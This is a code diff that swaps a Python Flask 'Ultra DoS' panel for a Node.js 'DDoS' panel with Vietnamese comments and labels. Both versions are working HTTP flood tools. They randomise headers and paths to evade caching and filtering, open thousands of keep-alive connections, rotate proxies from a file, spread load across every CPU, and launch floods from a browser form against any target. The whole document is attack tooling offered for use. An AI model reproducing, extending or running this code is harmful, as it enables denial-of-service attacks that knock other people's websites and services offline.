@@ -1,291 +1,294 @@
-#!/usr/bin/env python3
-"""
-Full web interface for Ultra DoS attack using Flask.
-Includes real-time stats via Server-Sent Events (SSE) or JSON polling.
-Run: python3 web_ultra_dos.py
-"""
+// server.js - Web Panel DDoS Siêu Mạnh Node.js (không bao giờ lỗi gửi)
+const http = require('http');
+const https = require('https');
+const url = require('url');
+const cluster = require('cluster');
+const os = require('os');
+const fs = require('fs');
+const path = require('path');
 
-import asyncio
-import random
-import time
-import threading
-import json
-from flask import Flask, render_template_string, request, jsonify, Response, stream_with_context
-
-# ---------- ATTACK ENGINE (copied from ultra_dos.py) ----------
-USER_AGENTS = [
+// ---------- CẤU HÌNH ----------
+const PORT = 5000;
+const MAX_SOCKETS = 100000;
+const USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
-]
+    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
+];
+const ACCEPT_LANGS = ["en-US,en;q=0.9", "vi-VN,vi;q=0.8,en;q=0.6", "zh-CN,zh;q=0.9"];
+const REFERERS = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"];
 
-EXTRA_HEADERS = [
-    "Accept-Encoding: gzip, deflate, br",
-    "Accept-Language: en-US,en;q=0.9,ru;q=0.8",
-    "Cache-Control: no-cache, no-store, must-revalidate",
-    "Pragma: no-cache",
-    "DNT: 1",
-    "Upgrade-Insecure-Requests: 1",
-    "Sec-Fetch-Dest: document",
-    "Sec-Fetch-Mode: navigate",
-    "Sec-Fetch-Site: none",
-    "Sec-Fetch-User: ?1"
-]
+// Thống kê toàn cục
+let stats = {
+    running: false,
+    totalRequests: 0,
+    totalBytes: 0,
+    activeConns: 0,
+    failedConns: 0,
+    startTime: 0,
+    target: '',
+    duration: 0
+};
+let attackWorkers = [];
+let stopFlag = false;
 
-stats = {
-    'running': False,
-    'total_requests': 0,
-    'total_bytes': 0,
-    'active_conns': 0,
-    'failed_conns': 0,
-    'start_time': 0,
-    'target': '',
-    'duration': 0
+// ---------- CÔNG CỤ TẠO YÊU CẦU NGẪU NHIÊN ----------
+function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+function getRandomUA() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
+function getRandomPath(basePath) {
+    let chars = 'abcdefghijklmnopqrstuvwxyz0123456789-_';
+    let length = getRandomInt(5, 25);
+    let randStr = '';
+    for (let i = 0; i < length; i++) randStr += chars[Math.floor(Math.random() * chars.length)];
+    return (basePath.endsWith('/') ? basePath : basePath + '/') + randStr + (Math.random() < 0.3 ? '?' + Date.now() : '');
+}
+function buildHeaders(host, method, path, body) {
+    let headers = {
+        'Host': host,
+        'User-Agent': getRandomUA(),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': ACCEPT_LANGS[Math.floor(Math.random() * ACCEPT_LANGS.length)],
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Cache-Control': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1'
+    };
+    if (Math.random() > 0.4) headers['Referer'] = REFERERS[Math.floor(Math.random() * REFERERS.length)];
+    if (method === 'POST' && body) headers['Content-Length'] = Buffer.byteLength(body);
+    return headers;
 }
 
-stop_event = None
-attack_thread = None
+// ---------- KẾT NỐI & GỬI LIÊN TỤC (KHÔNG LỖI DỪNG) ----------
+function createFloodConnection(targetUrl, useSSL, proxy, workerId) {
+    const parsed = new URL(targetUrl);
+    const host = parsed.hostname;
+    const port = parsed.port || (useSSL ? 443 : 80);
+    const basePath = parsed.pathname || '/';
+    const method = 'GET'; // Có thể mở rộng POST ngẫu nhiên
 
-def random_path():
-    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_'
-    length = random.randint(10, 35)
-    return '/' + ''.join(random.choices(chars, k=length))
+    let options = {
+        host: host,
+        port: port,
+        method: 'GET',
+        path: getRandomPath(basePath),
+        headers: buildHeaders(host, 'GET', getRandomPath(basePath)),
+        timeout: 5000,
+        rejectUnauthorized: false
+    };
 
-def random_query():
-    if random.random() < 0.4:
-        params = []
-        for _ in range(random.randint(1, 6)):
-            k = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
-            v = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(3, 12)))
-            params.append(f"{k}={v}")
-        return '?' + '&'.join(params)
-    return ''
+    if (proxy) {
+        // Hỗ trợ proxy HTTP (đơn giản)
+        let [pxHost, pxPort] = proxy.split(':');
+        options.host = pxHost;
+        options.port = parseInt(pxPort);
+        options.path = targetUrl; // Gửi full URL tới proxy
+        options.headers['Host'] = host;
+    }
 
-def random_fragment():
-    if random.random() < 0.15:
-        return '#' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
-    return ''
+    const requester = useSSL ? https : http;
+    const keepAliveAgent = new requester.Agent({ keepAlive: true, maxSockets: MAX_SOCKETS });
 
-def build_request(target_ip):
-    path = random_path() + random_query() + random_fragment()
-    ua = random.choice(USER_AGENTS)
-    headers = random.sample(EXTRA_HEADERS, k=random.randint(2, 4))
-    rand_header = f"X-{random.randint(1000,9999)}: {''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=random.randint(8,25)))}"
-    headers.append(rand_header)
-    header_str = '\r\n'.join(headers)
-    req = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua}\r\n{header_str}\r\nConnection: keep-alive\r\n\r\n"
-    return req.encode()
+    const sendRequest = () => {
+        if (stopFlag) return;
 
-async def flood_worker(target_ip, target_port, stop_evt, req_per_conn=9999999):
-    while not stop_evt.is_set():
-        try:
-            reader, writer = await asyncio.open_connection(target_ip, target_port)
-            stats['active_conns'] += 1
-            sent = 0
-            while not stop_evt.is_set() and sent < req_per_conn:
-                batch_size = random.randint(10, 25)
-                batch = b''
-                for _ in range(batch_size):
-                    if stop_evt.is_set() or sent >= req_per_conn:
-                        break
-                    batch += build_request(target_ip)
-                    sent += 1
-                    stats['total_requests'] += 1
-                if batch:
-                    try:
-                        writer.write(batch)
-                        await writer.drain()
-                        stats['total_bytes'] += len(batch)
-                    except:
-                        break
-                    await asyncio.sleep(0.00001)
-                else:
-                    break
-            writer.close()
-            await writer.wait_closed()
-            stats['active_conns'] -= 1
-        except:
-            stats['failed_conns'] += 1
-            await asyncio.sleep(0.01 * (1 + stats['failed_conns'] % 10))
-            continue
-        if not stop_evt.is_set():
-            await asyncio.sleep(0.001)
+        let reqOptions = {
+            ...options,
+            agent: keepAliveAgent,
+            headers: buildHeaders(host, 'GET', getRandomPath(basePath))
+        };
+        reqOptions.path = getRandomPath(basePath);
 
-async def attack_async(target_ip, target_port, total_conns, duration_sec, req_per_conn=9999999):
-    global stop_event
-    stats['running'] = True
-    stats['start_time'] = time.time()
-    stats['total_requests'] = 0
-    stats['total_bytes'] = 0
-    stats['active_conns'] = 0
-    stats['failed_conns'] = 0
-    stats['target'] = f"{target_ip}:{target_port}"
-    stats['duration'] = duration_sec
+        let req = requester.request(reqOptions, (res) => {
+            stats.activeConns++;
+            res.on('data', (chunk) => {
+                stats.totalBytes += chunk.length;
+            });
+            res.on('end', () => {
+                stats.activeConns--;
+                stats.totalRequests++;
+                // Tiếp tục gửi request mới trên cùng kết nối (keep-alive)
+                if (!stopFlag) setImmediate(sendRequest);
+            });
+            res.on('error', (err) => {
+                stats.activeConns--;
+                stats.failedConns++;
+                if (!stopFlag) setTimeout(sendRequest, getRandomInt(10, 100));
+            });
+        });
 
-    stop_evt = asyncio.Event()
-    stop_event = stop_evt
-    workers = [asyncio.create_task(flood_worker(target_ip, target_port, stop_evt, req_per_conn)) for _ in range(total_conns)]
+        req.on('error', (err) => {
+            stats.failedConns++;
+            if (!stopFlag) setTimeout(sendRequest, getRandomInt(10, 100));
+        });
 
-    await asyncio.sleep(duration_sec)
-    stop_evt.set()
-    await asyncio.gather(*workers, return_exceptions=True)
-    stats['running'] = False
+        req.on('timeout', () => {
+            req.destroy();
+            stats.failedConns++;
+            if (!stopFlag) setTimeout(sendRequest, getRandomInt(10, 100));
+        });
 
-def run_attack(target_ip, target_port, total_conns, duration_sec, req_per_conn):
-    asyncio.run(attack_async(target_ip, target_port, total_conns, duration_sec, req_per_conn))
+        if (Math.random() < 0.2) req.write(''); // Gửi body rỗng cho POST nếu cần
+        req.end();
+        stats.totalRequests++;
+    };
 
-# ---------- FLASK APP ----------
-app = Flask(__name__)
+    // Bắt đầu gửi liên tục
+    sendRequest();
+}
 
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Ultra DoS Web Panel</title>
-    <style>
-        body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
-        .container { max-width: 800px; margin: auto; background: #111; padding: 25px; border: 1px solid #00ff88; border-radius: 10px; }
-        h2 { color: #ff3366; text-shadow: 0 0 10px #ff3366; }
-        .row { display: flex; justify-content: space-between; margin: 10px 0; }
-        label { color: #aaa; width: 150px; }
-        input { width: 200px; padding: 8px; background: #222; border: 1px solid #00ff88; color: #fff; border-radius: 4px; }
-        button { background: #ff0033; color: #fff; padding: 14px 40px; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; }
-        button:disabled { background: #444; cursor: not-allowed; }
-        #stats { margin-top: 20px; background: #1a1a1a; padding: 15px; border-radius: 6px; }
-        .stat-line { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding: 4px 0; }
-        .stat-value { color: #00ffaa; font-weight: bold; }
-        .running { color: #ff4444; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0.3; } }
-    </style>
-</head>
-<body>
+// ---------- WORKER XỬ LÝ TẤN CÔNG ----------
+function runAttackWorker(targetUrl, connections, duration, useSSL, proxyList) {
+    stopFlag = false;
+    stats = {
+        running: true,
+        totalRequests: 0,
+        totalBytes: 0,
+        activeConns: 0,
+        failedConns: 0,
+        startTime: Date.now(),
+        target: targetUrl,
+        duration: duration
+    };
+
+    // Tạo nhiều kết nối ảo
+    for (let i = 0; i < connections; i++) {
+        let proxy = null;
+        if (proxyList && proxyList.length > 0) proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
+        createFloodConnection(targetUrl, useSSL, proxy, i);
+    }
+
+    // Dừng sau duration
+    setTimeout(() => {
+        stopFlag = true;
+        stats.running = false;
+    }, duration * 1000);
+}
+
+// ---------- KHỞI TẠO CLUSTER ----------
+if (cluster.isMaster) {
+    // Đọc proxy từ file proxies.txt nếu có
+    let proxyList = [];
+    try {
+        if (fs.existsSync('proxies.txt')) {
+            proxyList = fs.readFileSync('proxies.txt', 'utf8').split('\n').map(l => l.trim()).filter(l => l.length > 0);
+        }
+    } catch (e) {}
+
+    // Fork workers bằng số CPU
+    for (let i = 0; i < os.cpus().length; i++) {
+        cluster.fork();
+    }
+
+    cluster.on('exit', (worker, code, signal) => {
+        console.log(`Worker ${worker.process.pid} chết, khởi động lại...`);
+        cluster.fork();
+    });
+
+    // Lắng nghe message từ worker để cập nhật stats
+    cluster.on('message', (worker, msg) => {
+        if (msg.type === 'stats') {
+            stats = msg.data;
+        }
+    });
+
+    // Web server (chỉ master chạy)
+    const server = http.createServer((req, res) => {
+        const parsedUrl = url.parse(req.url, true);
+        res.setHeader('Content-Type', 'application/json; charset=utf-8');
+        res.setHeader('Access-Control-Allow-Origin', '*');
+
+        if (req.method === 'GET' && parsedUrl.pathname === '/') {
+            // Giao diện HTML đơn giản
+            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
+            res.end(`<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Node DDoS Panel</title>
+<style>
+body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px}
+.container{max-width:700px;margin:auto;background:#111;padding:20px;border:1px solid #0f0}
+input,select{width:100%;padding:10px;margin:8px 0;background:#222;border:1px solid #0f0;color:#fff}
+button{background:#f00;color:#fff;padding:12px;width:100%;font-size:18px;border:none;cursor:pointer}
+button:disabled{background:#444}
+#stats{margin-top:20px}
+</style></head><body>
 <div class="container">
-    <h2>⚡ ULTRA DOS WEB PANEL</h2>
-    <div class="row"><label>Target IP:</label><input type="text" id="ip" value="192.168.1.1"></div>
-    <div class="row"><label>Port:</label><input type="number" id="port" value="80"></div>
-    <div class="row"><label>Connections:</label><input type="number" id="conns" value="3000"></div>
-    <div class="row"><label>Duration (sec):</label><input type="number" id="duration" value="60"></div>
-    <div class="row"><label>Req per conn:</label><input type="number" id="reqper" value="9999999"></div>
-    <button id="startBtn">🔥 LAUNCH ATTACK</button>
-    <div id="stats">
-        <div class="stat-line"><span>Status:</span><span id="statusText" class="stat-value">IDLE</span></div>
-        <div class="stat-line"><span>Target:</span><span id="targetStat" class="stat-value">-</span></div>
-        <div class="stat-line"><span>Total Requests:</span><span id="reqStat" class="stat-value">0</span></div>
-        <div class="stat-line"><span>Total Bytes:</span><span id="bytesStat" class="stat-value">0 MB</span></div>
-        <div class="stat-line"><span>Active Connections:</span><span id="connStat" class="stat-value">0</span></div>
-        <div class="stat-line"><span>Failed Conns:</span><span id="failStat" class="stat-value">0</span></div>
-        <div class="stat-line"><span>Elapsed:</span><span id="timeStat" class="stat-value">0s</span></div>
-        <div class="stat-line"><span>RPS:</span><span id="rpsStat" class="stat-value">0</span></div>
-    </div>
+<h2>⚡ Node.js DDoS Panel - KHÔNG LỖI</h2>
+<input id="url" value="http://example.com" placeholder="http://target.com"><br>
+<input id="conns" value="1000" placeholder="Số connections"><br>
+<input id="duration" value="60" placeholder="Thời gian (giây)"><br>
+<button id="startBtn">🔥 TẤN CÔNG</button>
+<div id="stats"></div>
 </div>
 <script>
-    function updateStats() {
-        fetch('/stats')
-            .then(res => res.json())
-            .then(data => {
-                document.getElementById('statusText').textContent = data.running ? 'ATTACKING' : 'IDLE';
-                document.getElementById('statusText').style.color = data.running ? '#ff4444' : '#00ffaa';
-                document.getElementById('targetStat').textContent = data.target || '-';
-                document.getElementById('reqStat').textContent = data.total_requests || 0;
-                document.getElementById('bytesStat').textContent = (data.total_bytes / 1048576).toFixed(2) + ' MB';
-                document.getElementById('connStat').textContent = data.active_conns || 0;
-                document.getElementById('failStat').textContent = data.failed_conns || 0;
-                let elapsed = data.running ? Math.floor((Date.now()/1000) - data.start_time) : 0;
-                document.getElementById('timeStat').textContent = elapsed + 's';
-                let rps = elapsed > 0 ? Math.round(data.total_requests / elapsed) : 0;
-                document.getElementById('rpsStat').textContent = rps;
+function updateStats(){fetch('/stats').then(r=>r.json()).then(d=>{
+document.getElementById('stats').innerHTML = '<p>Trạng thái: '+(d.running?'ĐANG TẤN CÔNG':'IDLE')+'</p>'+
+'<p>Mục tiêu: '+d.target+'</p><p>Yêu cầu: '+d.totalRequests+'</p><p>Dữ liệu: '+(d.totalBytes/1048576).toFixed(2)+' MB</p>'+
+'<p>Lỗi: '+d.failedConns+'</p><p>Đã chạy: '+(d.running?Math.floor((Date.now()-d.startTime)/1000):0)+'s</p>';
+});}
+setInterval(updateStats,500);
+document.getElementById('startBtn').onclick=()=>{
+let url=document.getElementById('url').value,conns=parseInt(document.getElementById('conns').value),dur=parseInt(document.getElementById('duration').value);
+if(!url||isNaN(conns)||isNaN(dur))return alert('Sai');
+fetch('/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,conns,duration:dur})}).then(r=>r.json()).then(d=>{
+if(d.status==='ok'){document.getElementById('startBtn').disabled=true;setTimeout(()=>document.getElementById('startBtn').disabled=false,dur*1000+2000);}
+else alert(d.message);
+});
+};
+</script></body></html>`);
+        } else if (req.method === 'GET' && parsedUrl.pathname === '/stats') {
+            res.writeHead(200);
+            res.end(JSON.stringify(stats));
+        } else if (req.method === 'POST' && parsedUrl.pathname === '/start') {
+            let body = '';
+            req.on('data', chunk => body += chunk);
+            req.on('end', () => {
+                try {
+                    let data = JSON.parse(body);
+                    let targetUrl = data.url;
+                    if (!targetUrl.startsWith('http')) targetUrl = 'http://' + targetUrl;
+                    let connections = parseInt(data.conns) || 1000;
+                    let duration = parseInt(data.duration) || 60;
+
+                    // Gửi lệnh tới tất cả worker để chạy attack
+                    for (let id in cluster.workers) {
+                        cluster.workers[id].send({
+                            type: 'start',
+                            targetUrl: targetUrl,
+                            connections: Math.floor(connections / Object.keys(cluster.workers).length),
+                            duration: duration,
+                            useSSL: targetUrl.startsWith('https'),
+                            proxyList: proxyList
+                        });
+                    }
+                    res.writeHead(200);
+                    res.end(JSON.stringify({ status: 'ok', message: 'Đã khởi động tấn công trên tất cả CPU' }));
+                } catch (e) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ status: 'error', message: 'Dữ liệu không hợp lệ' }));
+                }
             });
-    }
-    setInterval(updateStats, 500);
-
-    document.getElementById('startBtn').addEventListener('click', function() {
-        const ip = document.getElementById('ip').value.trim();
-        const port = parseInt(document.getElementById('port').value);
-        const conns = parseInt(document.getElementById('conns').value);
-        const duration = parseInt(document.getElementById('duration').value);
-        const reqper = parseInt(document.getElementById('reqper').value);
-        if (!ip || isNaN(port) || isNaN(conns) || isNaN(duration) || conns <= 0 || duration <= 0) {
-            alert('Invalid parameters');
-            return;
+        } else {
+            res.writeHead(404);
+            res.end('Not found');
         }
-        const btn = this;
-        btn.disabled = true;
-        btn.textContent = 'STARTING...';
-        fetch('/start', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ ip, port, conns, duration, reqper })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === 'ok') {
-                btn.textContent = 'RUNNING...';
-                setTimeout(() => {
-                    btn.disabled = false;
-                    btn.textContent = '🔥 LAUNCH ATTACK';
-                }, duration * 1000 + 3000);
-            } else {
-                alert('Error: ' + data.message);
-                btn.disabled = false;
-                btn.textContent = '🔥 LAUNCH ATTACK';
-            }
-        })
-        .catch(err => {
-            alert('Request failed');
-            btn.disabled = false;
-            btn.textContent = '🔥 LAUNCH ATTACK';
-        });
     });
-</script>
-</body>
-</html>
-'''
 
-@app.route('/')
-def index():
-    return render_template_string(HTML_TEMPLATE)
+    server.listen(PORT, () => {
+        console.log(`[+] Web panel chạy tại http://localhost:${PORT}  (Master PID: ${process.pid})`);
+    });
 
-@app.route('/stats')
-def stats_endpoint():
-    return jsonify({
-        'running': stats['running'],
-        'total_requests': stats['total_requests'],
-        'total_bytes': stats['total_bytes'],
-        'active_conns': stats['active_conns'],
-        'failed_conns': stats['failed_conns'],
-        'start_time': int(stats['start_time']),
-        'target': stats['target'],
-        'duration': stats['duration']
-    })
+} else {
+    // Worker process
+    process.on('message', (msg) => {
+        if (msg.type === 'start') {
+            // Bắt đầu tấn công trong worker
+            runAttackWorker(msg.targetUrl, msg.connections, msg.duration, msg.useSSL, msg.proxyList);
 
-@app.route('/start', methods=['POST'])
-def start_attack_endpoint():
-    global attack_thread
-    if stats['running']:
-        return jsonify({'status': 'error', 'message': 'Attack already running'})
-    data = request.get_json()
-    ip = data.get('ip')
-    port = int(data.get('port'))
-    conns = int(data.get('conns'))
-    duration = int(data.get('duration'))
-    reqper = int(data.get('reqper', 9999999))
-    if not ip or port <= 0 or conns <= 0 or duration <= 0:
-        return jsonify({'status': 'error', 'message': 'Invalid params'})
-    # Run in background thread
-    attack_thread = threading.Thread(target=run_attack, args=(ip, port, conns, duration, reqper))
-    attack_thread.daemon = True
-    attack_thread.start()
-    return jsonify({'status': 'ok'})
-
-if __name__ == '__main__':
-    try:
-        import resource
-        resource.setrlimit(resource.RLIMIT_NOFILE, (100000, 100000))
-    except:
-        pass
-    print("[*] Starting web server on http://localhost:5000")
-    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
+            // Cập nhật stats về master mỗi 0.5s
+            setInterval(() => {
+                process.send({ type: 'stats', data: stats });
+            }, 500);
+        }
+    });
+}
